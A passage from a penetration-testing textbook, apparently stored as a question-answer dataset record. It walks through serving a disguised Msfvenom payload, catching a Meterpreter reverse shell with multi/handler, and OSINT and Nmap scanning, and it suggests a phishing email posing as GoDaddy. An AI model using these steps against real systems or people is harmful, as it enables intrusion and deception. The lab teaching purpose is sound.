to lure users into down-\nloading and running malicious payloads in Chapter 11.)\nServing Payloads\nOne good way to serve up payloads is to host them on a web server, disguise\nthem as something useful, and lure users into downloading them. For this\nexample, we’ll host our Metasploit executable on our Kali machine’s built-\nin Apache server and browse to the file from our target machine. First, run cp chapter4example.exe /var/www to copy the payload executable\nto the Apache directory, and then make sure the web server is started with\nservice apache2 start. root@kali:~# cp chapter4example.exe /var/www\nroot@kali:~# service apache2 start\nStarting web server apache2 [ OK ]\nNow switch to your Windows XP target and open Internet Explorer. Browse to http://192.168.20.9/chapter4example.exe and download the file. But before we run the file, we have one loose end to deal with. So far when attempting to exploit our target machine, Metasploit set\nup our payload handlers and sent the exploit. When we used Msfconsole to\nexploit the MS08-067 vulnerability with a reverse shell payload, Metasploit\nfirst set up a handler listening on port 4444 for the reverse connection, but\nup to this point we have nothing listening for a reverse connection from the\npayload we created with Msfvenom. Using the Multi/Handler Module\nStart Msfconsole again, and we’ll look at a Metasploit module called multi/\nhandler. This module allows us to set up standalone handlers, which is just\nwhat we’re lacking.",
    "question": "What is the purpose of the Metasploit Framework and how does it assist in penetration testing?",
    "summary": "This text explains how to create a Bash script for a ping sweep to check network hosts and a Python script for port scanning. It also covers how to use the Metasploit Framework to exploit a vulnerability in a Windows XP system, including setting up a reverse shell and using Msfvenom to generate standalone payloads. The text highlights the importance of understanding different scripting languages and how to use Metasploit for penetration testing."
  },
  {
    "start": 32,
    "end": 50,
    "text": "We need a handler to catch our Meterpreter connection\nwhen our malicious executable is run from the Windows XP target. Select\nthe multi/handler module with use multi/handler. Using the Metasploit Framework 105\nThe first thing to do is tell multi/handler which of Metasploit’s many\nhandlers we need. We need to catch the windows/meterpreter/reverse_tcp\npayload we used when we created our executable with Msfvenom. Choose\nit with set PAYLOAD windows/meterpreter/reverse_tcp, and follow it with show\noptions (Listing 4-16). msf > use multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > show options\nModule options (exploit/multi/handler):\nName Current Setting Required Description\n---- --------------- -------- -----------\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process,\nnone\nLHOST yes The listen address\nLPORT 4444 yes The listen port\n--snip--\nmsf exploit(handler) >\nListing 4-16: Options with multi/handler\nFrom here we tell Metasploit which setup we used when we created the\npayload. We’ll set the LHOST option to our local Kali IP address and the LPORT\nto the port we chose in Msfvenom, in this case 192.168.20.9 and 12345,\nrespectively. Once all the options for the payload are set correctly, enter\nexploit, as shown in Listing 4-17. msf exploit(handler) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(handler) > set LPORT 12345\nLPORT => 12345\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:12345\n[*] Starting the payload handler... Listing 4-17: Setting up a handler\nAs you can see, Metasploit sets up a reverse handler on port 12345 as\ninstructed, listening for a payload to call back. 106 Chapter 4\nNow we can switch back to our Windows XP target and run our down-\nloaded executable. Run chapter4example.exe on your Windows target. Back\nin Msfconsole, you should see that the handler receives the reverse connec-\ntion, and you receive a Meterpreter session. [*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437)\nat 2015-09-01 11:20:00 -0400\nmeterpreter >\nSpend some time experimenting with Msfvenom if you like. We’ll\nreturn to this useful tool when we attempt to bypass antivirus solutions\nin Chapter 12. using an auxiliary module\nMetasploit was first conceived as an exploitation framework, and it contin-\nues to be a top contender in the world of exploitation. But in the ensuing\nyears, its functionality has grown in about as many directions as there are\ncreative minds working on it. I sometimes quip that Metasploit can do every-\nthing except my laundry, and I’m currently working on a module for that. Dirty socks aside, in addition to exploitation, Metasploit has modules\nto aid in every phase of pentesting. Some modules that are not used for\nexploitation are known as auxiliary modules; they include things like vulner-\nability scanners, fuzzers, and even denial of service modules. (A good rule\nof thumb to remember is that exploit modules use a payload and auxiliary\nmodules do not.)\nFor example, when we first used the windows/smb/ms08_067_netapi\nexploit module earlier in this chapter, one of its options was SMBPIPE. The\ndefault value for that option was BROWSER. Let’s look at an auxiliary module\nthat will enumerate the listening pipes on an SMB server, auxiliary/scanner/\nsmb/pipe_auditor (Listing 4-18). (We use auxiliary modules like exploits, and\nlike exploits we can also drop the auxiliary/ part of the module name.)\nmsf > use scanner/smb/pipe_auditor\nmsf auxiliary(pipe_auditor) > show options\nModule options (auxiliary/scanner/smb/pipe_auditor):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuRHOSTS yes The target address range or CIDR identifier\nSMBDomain WORKGROUP no The Windows domain to use for authentication\nSMBPass no The password for the specified username\nSMBUser no The username to authenticate as\nTHREADS 1 yes The number of concurrent threads\nListing 4-18: Options for scanner/smb/pipe_auditor\nUsing the Metasploit Framework 107\nThe options for this module are a bit different from what we’ve seen so\nfar. Instead of RHOST we have RHOSTS u, which allows us to specify more than\none remote host to run the module against. (Auxiliaries can be run against\nmultiple hosts, whereas exploits can exploit only one system at a time.)\nWe also see options for SMBUser, SMBPass, and SMBDomain. Because our\nWindows XP target is not part of any domain, we can leave the SMBDomain\nat the default value, WORKGROUP. We can leave the SMBUser and SMBPass values\nblank. The THREADS option allows us to control the speed of Metasploit by\nhaving our module run in multiple threads. We’re scanning only one sys-\ntem in this case, so the default value of 1 thread will work fine. The only\noption we need to set is RHOSTS to the IP address of our Windows XP target. msf auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10\nRHOSTS => 192.168.20.10\nEven though we aren’t technically exploiting anything in this case, we\ncan still tell Metasploit to run our auxiliary module by entering exploit. msf auxiliary(pipe_auditor) > exploit\n[*] 192.168.20.10 - Pipes: \\browser u\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(pipe_auditor) >\nThe module audits the listening SMB pipes on our Windows XP tar-\nget. As it turns out, the browser pipe is the only available pipe u. Because\nthis pipe is listening, this is the correct value for the SMBPIPE option in\nthe windows/smb/ms08_067_netapi exploit module we used earlier in the\nchapter. uPDating metasPloit\nThe exercises in this book are designed to work on a base install of Kali\nLinux 1 .0 .6 . Naturally, many security tools used in this book will have been\nupdated since Kali’s release . Metasploit in particular receives regular updates\nfrom core developers as well as from the security community . All of the material in this book works with the Metasploit version installed\non Kali 1 .0 .6 . As you continue your career as a pentester, you’ll want the latest\nMetasploit modules . The Metasploit Project is typically pretty solid at releasing\nmodules for the latest security issues circulating the Web . To pull down the lat-\nest modules from Metasploit’s GitHub, enter the following:\nroot@kali:~# msfupdate\n108 Chapter 4\nsummary\nIn this chapter we’ve gotten comfortable using some of Metasploit’s inter-\nfaces. We’ll return to Metasploit throughout the book. In the next few chapters we’ll simulate a penetration test against our\ntarget machines, covering a wide variety of vulnerability types. If you pur-\nsue a career in penetration testing, you will likely encounter clients span-\nning the gamut of possible security postures. Some will be missing so many\npatches across the organization that you may wonder if they have updated\nsince installing the base image back in 2001. Along with missing patches,\nyou may find additional vulnerabilities such as default passwords and mis-\nconfigured services. Gaining access to such networks is trivial for skilled\npenetration testers. On the other hand, you may also find yourself working for clients who\nhave patch management down pat, with everything from Windows operat-\ning systems to all third-party software on a regular patch cycle across the\norganization. Some clients may deploy cutting-edge security controls such\nas proxies that allow only Internet Explorer to call out to the Internet. This\nwill stop even Metasploit reverse shells that call back on ports 80 or 443 and\nlook like web traffic, unless you are able to exploit the Internet Explorer\nprogram, which may also be completely patched. You may find intrusion\nprevention firewalls at the perimeter that drop any string that looks even\na little bit like attack traffic. Simply throwing the MS08-067 Metasploit module at these high-\nsecurity networks will get you no results, except maybe a call from a net-\nwork monitoring vendor with a warrant for your arrest. (Don’t worry: As\npart of the penetration test, you will have a get-out-of-jail-free card.) But\neven highly secure networks are only as strong as their weakest link. For\ninstance, I once performed an onsite penetration test for a company that\nemployed all of the security controls I just mentioned. However, the local\nadministrator password on all the Windows workstations was the same five-\nletter dictionary word. After I cracked the password, I was able to log on as\nan administrator on every workstation on the network. From there I was\nable to use something called token impersonation to gain domain administra-\ntor access. Despite all the strong security controls, with a little effort I was\nable to take over the network the same way I would a network with missing\npatches from 2003. As you work through the rest of this book, you will pick up not only the\ntechnical skills required to break into vulnerable systems but also the mind-\nset required to find a way in when none seems readily apparent. Now let’s turn our attention to gathering information about our targets\nso we can develop a solid plan of attack. Using the Metasploit Framework 109\nPaRT II\nassessments\n5\ninformation g atHering\nIn this chapter we begin the information-gathering\nphase of penetration testing. The goal of this phase\nis to learn as much about our clients as we can. Does\nthe CEO reveal way too much on Twitter? Is the sys-\ntem administrator writing to archived listservs, asking\nabout how to secure a Drupal install? What software\nare their web servers running? Are the Internet-facing systems listening\non more ports than they should? Or, if this is an internal penetration test,\nwhat is the IP address of the domain controller? We’ll also start to interact with our target systems, learning as much as\nwe can about them without actively attacking them. We’ll use the knowledge\ngained in this phase to move on to the threat-modeling phase where we\nthink like attackers and develop plans of attack based on the information\nwe’ve gathered. Based on the information we uncover, we’ll actively search\nfor and verify vulnerabilities using vulnerability-scanning techniques, which\nare covered in the next chapter. open source intelligence gathering\nWe can learn a good deal about our client’s organization and infrastructure\nbefore we send a single packet their way, but information gathering can still\nbe a bit of a moving target. It isn’t feasible to study the online life of every\nemployee, and given a large amount of gathered information, it can be dif-\nficult to discern important data from noise. If the CEO tweets frequently\nabout a favorite sports team, that team’s name may be the basis for her\nwebmail password, but it could just as easily be entirely irrelevant. Other\ntimes it will be easier to pick up on something crucial. For instance, if your\nclient has online job postings for a system administrator who is an expert\nin certain software, chances are those platforms are deployed in the client’s\ninfrastructure. As opposed to intelligence gained from covert sources such as dump-\nster diving, dumping website databases, and social engineering, open source\nintelligence (or OSINT) is gathered from legal sources like public records\nand social media. The success of a pentest often depends on the results of\nthe information-gathering phase, so in this section, we will look at a few\ntools to obtain interesting information from these public sources. Netcraft\nSometimes the information that web servers and web-hosting companies\ngather and make publicly available can tell you a lot about a website. For\ninstance, a company called Netcraft logs the uptime and makes queries\nabout the underlying software. (This information is made publicly available\nat http://www.netcraft.com/.) Netcraft also provides other services, and their\nantiphishing offerings are of particular interest to information security. For example, Figure 5-1 shows the result when we query http://www\n.netcraft.com/ for http://www.bulbsecurity.com. As you can see, bulbsecurity.com\nwas first seen in March 2012. It was registered through GoDaddy, has an IP\naddress of 50.63.212.1, and is running Linux with an Apache web server.\n\nArmed with this information, when pentesting bulbsecurity.com, we could\nstart by ruling out vulnerabilities that affect only Microsoft IIS servers. Or,\nif we wanted to try social engineering to get credentials to the website, we\ncould write an email that appears to be from GoDaddy, asking the adminis-\ntrator to log in and check some security settings. 114 Chapter 5\nFigure 5-1: Netcraft’s results for bulbsecurity .com\nWhois Lookups\nAll domain registrars keep records of the domains they host. These records\ncontain information about the owner, including contact information. For\nexample, if we run the Whois command line tool on our Kali machine to\nquery for information about bulbsecurity.com, as shown in Listing 5-1, we see\nthat I used private registration, so we won’t learn much. root@kali:~# whois bulbsecurity.com\nRegistered through: GoDaddy.com, LLC (http://www.godaddy.com)\nDomain Name: BULBSECURITY.COM\nCreated on: 21-Dec-11\nExpires on: 21-Dec-12\nLast Updated on: 21-Dec-11\nRegistrant: u\nDomains By Proxy, LLC\nDomainsByProxy.com\n14747 N Northsight Blvd Suite 111, PMB 309\nScottsdale, Arizona 85260\nUnited States\nInformation Gathering 115\nTechnical Contact: v\nPrivate, Registration BULBSECURITY.COM@domainsbyproxy.com\nDomains By Proxy, LLC\nDomainsByProxy.com\n14747 N Northsight Blvd Suite 111, PMB 309\nScottsdale, Arizona 85260\nUnited States\n(480) 624-2599 Fax -- (480) 624-2598\nDomain servers in listed order:\nNS65.DOMAINCONTROL.COM w\n\nNS66.DOMAINCONTROL.COM\nListing 5-1: Whois information for bulbsecurity .com\nThis site has private registration, so both the registrant u and technical\ncontact v are domains by proxy. Domains by proxy offer private registra-\ntion, hiding your personal details in the Whois information for the domains\nyou own. However, we do see the domain servers w for bulbsecurity.com.\nRunning Whois queries against other domains will show more interesting\nresults. For example, if you do a Whois lookup on georgiaweidman.com, you\nmight get an interesting blast from the past, including my college phone\nnumber.\nDNS Reconnaissance\nWe can also use Domain Name System (DNS) servers to learn more about a\ndomain. DNS servers translate the human-readable URL www.bulbsecurity.com\ninto an IP address.\nNslookup\nFor example, we could use a command line tool such as Nslookup, as shown\nin Listing 5-2.\nroot@Kali:~# nslookup www.bulbsecurity.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nwww.bulbsecurity.com canonical name = bulbsecurity.com.\nName: bulbsecurity.com\nAddress: 50.63.212.1 u\nListing 5-2: Nslookup information for www .bulbsecurity .com\nNslookup returned the IP address of www.bulbsecurity.com, as you can\nsee at u.\nWe can also tell Nslookup to find the mail servers for the same website\nby looking for MX records (DNS speak for email), as shown in Listing 5-3.\n116 Chapter 5\nroot@kali:~# nslookup\n> set type=mx\n> bulbsecurity.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nbulbsecurity.com mail exchanger = 40 ASPMX2.GOOGLEMAIL.com.\nbulbsecurity.com mail exchanger = 20 ALT1.ASPMX.L.GOOGLE.com.\nbulbsecurity.com mail exchanger = 50 ASPMX3.GOOGLEMAIL.com.\nbulbsecurity.com mail exchanger = 30 ALT2.ASPMX.L.GOOGLE.com.\nbulbsecurity.com mail exchanger = 10 ASPMX.L.GOOGLE.com.\nListing 5-3: Nslookup information for bulbsecurity .com’s mail servers\nNslookup says bulbsecurity.com is using Google Mail for its email servers,\nwhich is correct because I use Google Apps.\nHost\nAnother utility for DNS queries is Host. We can ask Host for the name\nservers for a domain with the command host -t ns domain. A good example\nfor domain queries is zoneedit.com, a domain set up to demonstrate zone\ntransfer vulnerabilities, as shown here.\nroot@kali:~# host -t ns zoneedit.com\nzoneedit.com name server ns4.zoneedit.com.\nzoneedit.com name server ns3.zoneedit.com.\n--snip--\nThis output shows us all the DNS servers for zoneedit.com. Naturally,\nbecause I mentioned that this domain was set up to demonstrate zone\ntransfers, that’s what we are going to do next.\nZone Transfers\nDNS zone transfers allow name servers to replicate all the entries about a\ndomain. When setting up DNS servers, you typically have a primary name\nserver and a backup server. What better way to populate all the entries in\nthe secondary DNS server than to query the primary server for all of its\nentries?\nUnfortunately, many system administrators set up DNS zone transfers\ninsecurely, so that anyone can transfer the DNS records for a domain.\nzoneedit.com is an example of such a domain, and we can use the host com-\nmand to download all of its DNS records. Use the -l option to specify the\ndomain to transfer, and choose one of the name servers from the previous\ncommand, as shown in Listing 5-4.\nInformation Gathering 117\nroot@kali:~# host -l zoneedit.com ns2.zoneedit.com\nUsing domain server:\nName: ns2.zoneedit.com\nAddress: 69.72.158.226#53\nAliases:\nzoneedit.com name server ns4.zoneedit.com.\nzoneedit.com name server ns3.zoneedit.com.\nzoneedit.com name server ns15.zoneedit.com.\nzoneedit.com name server ns8.zoneedit.com.\nzoneedit.com name server ns2.zoneedit.com.\nzoneedit.com has address 64.85.73.107\nwww1.zoneedit.com has address 64.85.73.41\ndynamic.zoneedit.com has address 64.85.73.112\nbounce.zoneedit.com has address 64.85.73.100\n--snip--\nmail2.zoneedit.com has address 67.15.232.182\n--snip--\nListing 5-4: Zone transfer of zoneedit .com\nThere are pages and pages of DNS entries for zoneedit.com, which gives\nus a good idea of where to start in looking for vulnerabilities for our pen-\ntest. For example, mail2.zoneedit.com is probably a mail server, so we should\nlook for potentially vulnerable software running on typical email ports such\nas 25 (Simple Mail Transfer Protocol) and 110 (POP3). If we can find a web-\nmail server, any usernames we find may lead us in the right direction so that\nwe can guess passwords and gain access to sensitive company emails.\nSearching for Email Addresses\nExternal penetration tests often find fewer services exposed than internal\nones do. A good security practice is to expose only those services that must\nbe accessed remotely, like web servers, mail servers, VPN servers, and maybe\nSSH or FTP, and only those services that are mission critical. Services like\nthese are common attack surfaces, and unless employees use two-factor\nauthentication, accessing company webmail can be simple if an attacker\ncan guess valid credentials.\nOne excellent way to find usernames is by looking for email addresses\non the Internet. You might be surprised to find corporate email addresses\npublicly listed on parent-teacher association contact info, sports team ros-\nters, and, of course, social media.\nYou can use a Python tool called theHarvester to quickly scour thou-\nsands of search engine results for possible email addresses. theHarvester\ncan automate searching Google, Bing, PGP, LinkedIn, and others for email\naddresses. For example, in Listing 5-5, we’ll look at the first 500 results in\nall search engines for bulbsecurity.com.\n118 Chapter 5\nroot@kali:~# theharvester -d bulbsecurity.com -l 500 -b all\n*******************************************************************\n* *\n* | |_| |__ ___ /\\ /\\__ _ _ ____ _____ ___| |_ ___ _ __ *\n* | __| '_ \\ / _ \\ / /_/ / _` | '__\\ \\ / / _ \\/ __| __/ _ \\ '__| *\n* | |_| | | | __/ / __ / (_| | | \\ V / __/\\__ \\ || __/ | *\n* \\__|_| |_|\\___| \\/ /_/ \\__,_|_| \\_/ \\___||___/\\__\\___|_| *\n* *\n* TheHarvester Ver. 2.2a *\n* Coded by Christian Martorella *\n* Edge-Security Research *\n* cmartorella@edge-security.com *\n*******************************************************************\nFull harvest..\n[-] Searching in Google..\nSearching 0 results...\nSearching 100 results...\nSearching 200 results...\nSearching 300 results...\n--snip--\n[+] Emails found:\n------------------\ngeorgia@bulbsecurity.com\n[+] Hosts found in search engines:\n------------------------------------\n\n50.63.212.1:www.bulbsecurity.com\n--snip--\nListing 5-5: Running theHarvester against bulbsecurity .com\nThere’s not too much to be found for bulbsecurity.com, but theHarvester\ndoes find my email address, georgia@bulbsecurity.com, and the website,\nwww.bulbsecurity.com, as well as other websites I share virtual hosting\nwith. You may find more results if you run theHarvester against your\norganization.\nMaltego\nPaterva’s Maltego is a data-mining tool designed to visualize open source\nintelligence gathering. Maltego has both a commercial and a free com-\nmunity edition. The free Kali Linux version, which we’ll use in this book,\nlimits the results it returns, but we can still use it to gather a good deal of\ninteresting information very quickly. (The paid version offers more results\nand functionality. To use Maltego on your pentests, you will need a paid\nlicense.)\nInformation Gathering 119\nnote Feel free to use Maltego to study other Internet footprints, including your own, your\ncompany’s, your high school arch nemesis’s, and so on. Maltego uses information\npublicly available on the Internet, so it is perfectly legal to do reconnaissance on any\nentity.\nTo run Maltego, enter maltego at the command line. The Maltego GUI\nshould launch. You will be prompted to create a free account at the Paterva\nwebsite and log in. Once logged in, choose Open a blank graph and let me\nplay around, and then click Finish, as shown in Figure 5-2.\nFigure 5-2: Opening a new Maltego graph\nNow select the Palette option from the left-hand border. As you can see,\nwe can gather information about all sorts of entities.\nLet’s start with the bulbsecurity.com domain, as shown in Figure 5-3.\nExpand the Infrastructure option from the Palette (on the left of the\nMaltego window) and drag a Domain entity from the Palette onto the new\ngraph. By default, the domain is paterva.com. To change it to bulbsecurity.com,\neither double-click the text or change the text field at the right side of the\nscreen.\n120 Chapter 5\nFigure 5-3: Adding an entity to the graph\nOnce the domain is set, you can run transforms (Maltego-speak for\nqueries) on it, instructing Maltego to search for interesting information.\nLet’s start with a couple of simple transforms, which you can view by right-\nclicking the domain icon and choosing Run Transform, as shown in\nFigure 5-4.\nIn the figure, we can see all the transforms available for a domain entity.\nAs you work with different entities, different transform options will be avail-\nable. Let’s find the MX records for the bulbsecurity.com domain and, thus,\nwhere the mail servers are. Under All Transforms, choose the To DNS\nName – MX (mail server) transform.\nAs expected from our previous research, Maltego returns Google Mail\nservers, indicating that bulbsecurity.com uses Google Apps for email. We can\nrun the simple To Website [Quick lookup] transform to get the website\naddress of bulbsecurity.com. See Figure 5-5 for the results from both this and\nthe previous transform.\nInformation Gathering 121\nFigure 5-4: Maltego transforms\nFigure 5-5: Transform results\n122 Chapter 5\nMaltego correctly finds www.bulbsecurity.com. Attacking the Google\nMail servers will likely be out of the scope of any pentest, but more infor-\nmation on the www.bulbsecurity.com website would certainly be useful.\nWe can run transforms on any entity on the graph, so select the website\nwww.bulbsecurity.com to gather data on it. For instance, we can run the trans-\nform ToServerTechnologiesWebsite to see what software www.bulbsecurity.com\nis running, as shown in Figure 5-6.\nFigure 5-6: www .bulbsecurity .com software\nMaltego finds that www.bulbsecurity.com is an Apache web server with\nPHP, Flash, and so on, along with a WordPress install. WordPress, a com-\nmonly used blogging platform, has a long history of security issues (like\na lot of software). We’ll look at exploiting website vulnerabilities in Chap-\nter 14. (Let’s hope I am keeping my WordPress blog up to date, or else I\nmight wake up to find my site defaced one day. How embarrassing!)\nYou can find additional information and tutorials about Maltego at\nhttp://www.paterva.com/. Spend some time using Maltego transforms to find\ninteresting information about your organization. In skilled hands, Maltego\ncan turn hours of reconnaissance work into minutes with the same quality\nresults.\nPort scanning\nWhen you start a pentest, the potential scope is practically limitless. The\nclient could be running any number of programs with security issues: They\ncould have misconfiguration issues in their infrastructure that could lead to\ncompromise; weak or default passwords could give up the keys to the king-\ndom on otherwise secure systems; and so on. Pentests often narrow your\nInformation Gathering 123\nscope to a particular IP range and nothing more, and you won’t help your\nclient by developing a working exploit for the latest and greatest server-side\nvulnerability if they don’t use the vulnerable software. We need to find out\nwhich systems are active and which software we can talk to.\nManual Port Scanning\nFor example, in the previous chapter we saw that exploiting the MS08-\n067 vulnerability can be an easy win for attackers and pentesters alike. To\nuse this exploit, we need to find a Windows 2000, XP, or 2003 box with an\nSMB server that is missing the MS08-067 Microsoft patch available on the\nnetwork. We can get a good idea about the network-based attack surface by\nmapping the network range and querying systems for listening ports.\nWe can do this manually by connecting to ports with a tool such as\ntelnet or Netcat and recording the results. Let’s use Netcat to connect to\nthe Windows XP machine on port 25, the default port for the Simple Mail\nTransfer Protocol (SMTP).\nroot@kali:~# nc -vv 192.168.20.10 25\nnc: 192.168.20.10 (192.168.20.10) 25 [smtp]u open\nnc: using stream socket\nnc: using buffer size 8192\nnc: read 66 bytes from remote\n220 bookxp SMTP Server SLmail 5.5.0.4433 Ready\nESMTP spoken here\nnc: wrote 66 bytes to local\nAs it turns out, the Windows XP box is running an SMTP server\non port 25 u. After we connected, the SMTP server announced itself\nas SLMail version 5.5.0.4433.\nNow, keep in mind that admins can change banners like this to say\nanything, even sending attackers and pentesters on a wild goose chase,\nstudying vulnerabilities for a product that is not deployed. In most cases,\nhowever, versions in software banners will be fairly accurate, and just con-\nnecting to the port and viewing the banner provides a starting point for\nour pentesting research. Searching the Web for information about SLMail\nversion 5.5.0.4433 may yield some interesting results.\nOn the other hand, connecting to every possible TCP and UDP port on\njust one machine and noting the results can be time consuming. Luckily,\ncomputers are excellent at repetitive tasks like this, and we can use port-\nscanning tools such as Nmap to find listening ports for us.\nnote Everything we have done so far in this chapter is completely legal. But once we start\nactively querying systems, we are moving into murky legal territory. Attempting to break\ninto computers without permission is, of course, illegal in many countries. Though\nstealthy scan traffic may go unnoticed, you should practice the skills we study in the\nrest of this chapter (and the rest of this book) only on your target virtual machines or\nother systems you own or have written permission to test (known in the trade as a\nget-out-of-jail-free card).\n124 Chapter 5\nPort Scanning with Nmap\nNmap is an industry standard for port scanning. Entire books have been\nwritten just about using Nmap, and the manual page may seem a bit daunt-\ning. We will cover the basics of port scanning here and come back to the\ntool in later chapters.\nFirewalls with intrusion-detection and prevention systems have made\ngreat strides in detecting and blocking scan traffic, so you might run an\nNmap scan and receive no results at all. Though you could be hired to per-\nform an external pentest against a network range with no live hosts, it’s more\nlikely that you’re being blocked by a firewall. On the other hand, your Nmap\nresults might instead say that every host is alive, and will be listening on every\nport if your scan is detected.\na SYN Scan\nLet’s start by running a SYN scan against our target machines. A SYN scan\nis a TCP scan that does not finish the TCP handshake. A TCP connection\nstarts with a three-way handshake: SYN 4 SYN-ACK 4 ACK, as shown in\nFigure 5-7.\nSYN\n\nSYN-ACK\nACK\nFigure 5-7: TCP three-way handshake\nIn a SYN scan, Nmap sends the SYN and waits for the SYN-ACK if the\nport is open but never sends the ACK to complete the connection. If the\nSYN packet receives no SYN-ACK response, the port is not available; either\nit’s closed or the connection is being filtered. This way, Nmap finds out if a\nport is open without ever fully connecting to the target machine. The syn-\ntax for a SYN scan is the -sS flag.\nNext, as you can see in Listing 5-6, we specify the IP address(s) or range\nto scan. Finally, we use the -o option to output our Nmap results to a file. The\n-oA option tells Nmap to log our results in all formats: .nmap, .gnmap (grep-\npable Nmap), and XML. Nmap format, like the output that Nmap prints\nto the screen in Listing 5-6, is nicely formatted and easy to read. Greppable\nNmap (as the name implies) is formatted to be used with the grep utility to\nsearch for specific information. XML format is a standard used to import\nNmap results into other tools. Listing 5-6 shows the results of the SYN scan.\nnote It is always a good idea to take good notes of everything we do on our pentest.\nTools such as Dradis are designed specifically to track pentest data, but as long\nas you have notes of everything you did when you get to the reporting phase,\nyou will be okay. I personally am more of a pen-and-paper user, or at best, a\nInformation Gathering 125\ncreating-a-long-Word-document-with-all-of-my-results type. The methods used for track-\ning results vary from pentester to pentester. Outputting your Nmap results to files is a\ngood way to make sure you have a record of your scan. Also, you can use the Linux\ncommand script to record everything printed to your terminal—another good way to\nkeep track of everything you have done.\nroot@kali:~# nmap -sS 192.168.20.10-12 -oA booknmap\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 07:28 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00056s latency).\nNot shown: 991 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp v\n25/tcp open smtp y\n80/tcp open http w\n106/tcp open pop3pw y\n110/tcp open pop3 y\n135/tcp open msrpc\n139/tcp open netbios-ssn x\n443/tcp open https w\n445/tcp open microsoft-ds x\n1025/tcp open NFS-or-IIS\n3306/tcp open mysql z\n5000/tcp open upnp\nMAC Address: 00:0C:29:A5:C1:24 (VMware)\nNmap scan report for 192.168.20.11\nHost is up (0.00031s latency).\nNot shown: 993 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp v\n22/tcp open ssh\n80/tcp open http w\n111/tcp open rpcbind\n139/tcp open netbios-ssn x\n445/tcp open microsoft-ds x\n2049/tcp open nfs\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\nNmap scan report for 192.168.20.12\nHost is up (0.0014s latency).\nNot shown: 999 filtered ports\n\nPORT STATE SERVICE\n80/tcp open http u\n135/tcp open msrpc\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\nNmap done: 3 IP addresses (3 hosts up) scanned in 1070.40 seconds\nListing 5-6: Running an Nmap SYN scan\n126 Chapter 5\nAs you can see, Nmap returns a handful of ports on the Windows XP\nand Linux boxes. We will see as we move through the next few chapters that\nnearly all of these ports contain vulnerabilities. Hopefully, that won’t be the\ncase on your pentests, but in an attempt to introduce you to many types of\nvulnerabilities you will encounter in the field, our pentesting lab has been\ncondensed into these three machines.\nThat said, just because a port is open does not mean that vulnerabilities\nare present. Rather it leaves us with the possibility that vulnerable software\nmight be running on these ports. Our Windows 7 machine is listening only\non port 80 u, the traditional port for HTTP web servers, and port 139\nfor remote procedure call. There may be exploitable software listening\non ports that are not allowed through the Windows firewall, and there\nmay be vulnerable software running locally on the machine, but at the\nmoment we can’t attempt to exploit anything directly over the network\nexcept the web server.\nThis basic Nmap scan has already helped us focus our pentesting efforts.\nBoth the Windows XP and Linux targets are running FTP servers v, web\nservers w, and SMB servers x. The Windows XP machine is also running a\nmail server that has opened several ports y and a MySQL server z.\na Version Scan\nOur SYN scan was stealthy, but it didn’t tell us much about the software that\nis actually running on the listening ports. Compared to the detailed version\ninformation we got by connecting to port 25 with Netcat, the SYN scan’s\nresults are a bit lackluster. We can use a full TCP scan (nmap -sT) or go a\nstep further and use Nmap’s version scan (nmap -sV) to get more data. With\nthe version scan shown in Listing 5-7, Nmap completes the connection and\nthen attempts to determine what software is running and, if possible, the\nversion, using techniques such as banner grabbing.\nroot@kali:~# nmap -sV 192.168.20.10-12 -oA bookversionnmap\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:29 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00046s latency).\nNot shown: 991 closed ports\n\nPORT STATE SERVICE VERSION\n21/tcp open ftp FileZilla ftpd 0.9.32 beta\n25/tcp open smtp SLmail smtpd 5.5.0.4433\n79/tcp open finger SLMail fingerd\n80/tcp open http Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k\nmod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)\n106/tcp open pop3pw SLMail pop3pw\n110/tcp open pop3 BVRP Software SLMAIL pop3d\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn\n443/tcp open ssl/http Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k\nmod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open msrpc Microsoft Windows RPC\nInformation Gathering 127\n3306/tcp open mysql MySQL (unauthorized)\n5000/tcp open upnp Microsoft Windows UPnP\nMAC Address: 00:0C:29:A5:C1:24 (Vmware)\nService Info: Host: georgia.com; OS: Windows; CPE: cpe:/o:microsoft:windows\nNmap scan report for 192.168.20.11\nHost is up (0.00065s latency).\nNot shown: 993 closed ports\n\nPORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4 u\n22/tcp open ssh OpenSSH 5.1p1 Debian 3ubuntu1 (protocol 2.0)\n80/tcp open http Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with\nSuhosin-Patch)\n111/tcp open rpcbind (rpcbind V2) 2 (rpc #100000)\n139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n2049/tcp open nfs (nfs V2-4) 2-4 (rpc #100003)\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\nService Info: OSs: Unix, 